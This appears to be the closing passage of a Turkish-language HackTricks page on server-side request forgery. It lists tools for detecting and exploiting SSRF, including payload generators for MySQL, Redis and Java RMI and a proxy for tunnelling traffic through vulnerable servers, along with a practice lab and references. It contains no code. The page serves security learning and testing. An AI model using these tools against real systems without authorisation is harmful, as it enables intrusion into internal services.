Bilinen birkaç platform SSRF zafiyetleri içeriyor veya içeriyordu, bunlara şu kaynaktan bakın:


{{#ref}}
ssrf-vulnerable-platforms.md
{{#endref}}

## Araçlar

### [**SSRFMap**](https://github.com/swisskyrepo/SSRFmap)

SSRF zafiyetlerini tespit etmek ve istismar etmek için araç

### [Gopherus](https://github.com/tarunkant/Gopherus)

- [Blog post on Gopherus](https://spyclub.tech/2018/08/14/2018-08-14-blog-on-gopherus/)

Bu araç için Gopher payload'ları oluşturur:

- MySQL
- PostgreSQL
- FastCGI
- Redis
- Zabbix
- Memcache

### [remote-method-guesser](https://github.com/qtc-de/remote-method-guesser)

- [Blog post on SSRF usage](https://blog.tneitzel.eu/posts/01-attacking-java-rmi-via-ssrf/)

_remote-method-guesser_ en yaygın _Java RMI_ zafiyetleri için saldırı operasyonlarını destekleyen bir _Java RMI_ zafiyet tarayıcısıdır. Mevcut operasyonların çoğu, istenen operasyon için bir _SSRF_ payload'u oluşturmak üzere `--ssrf` seçeneğini destekler. `--gopher` seçeneği ile birlikte, hazır kullanılabilir _gopher_ payload'ları doğrudan üretilebilir.

### [SSRF Proxy](https://github.com/bcoles/ssrf_proxy)

SSRF Proxy, client HTTP trafiğini Server-Side Request Forgery (SSRF) zafiyetine sahip HTTP sunucuları üzerinden tünellemek için tasarlanmış çok iş parçacıklı bir HTTP proxy sunucusudur.

### To practice


{{#ref}}
https://github.com/incredibleindishell/SSRF_Vulnerable_Lab
{{#endref}}

## Kaynaklar

- [https://medium.com/@pravinponnusamy/ssrf-payloads-f09b2a86a8b4](https://medium.com/@pravinponnusamy/ssrf-payloads-f09b2a86a8b4)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
- [https://www.invicti.com/blog/web-security/ssrf-vulnerabilities-caused-by-sni-proxy-misconfigurations/](https://www.invicti.com/blog/web-security/ssrf-vulnerabilities-caused-by-sni-proxy-misconfigurations/)
- [https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies)
- [Positive Technologies – Blind Trust: What Is Hidden Behind the Process of Creating Your PDF File?](https://swarm.ptsecurity.com/blind-trust-what-is-hidden-behind-the-process-of-creating-your-pdf-file/)
- [Tenable – SSRF Vulnerability in Java TLS Handshakes That Creates DoS Risk](https://www.tenable.com/blog/tenable-discovers-ssrf-vulnerability-in-java-tls-handshakes-that-creates-dos-risk)
- [RFC 5280 §4.2.2.1 Authority Information Access](https://datatracker.ietf.org/doc/html/rfc5280#section-4.2.2.1)

{{#include ../../banners/hacktricks-training.md}}
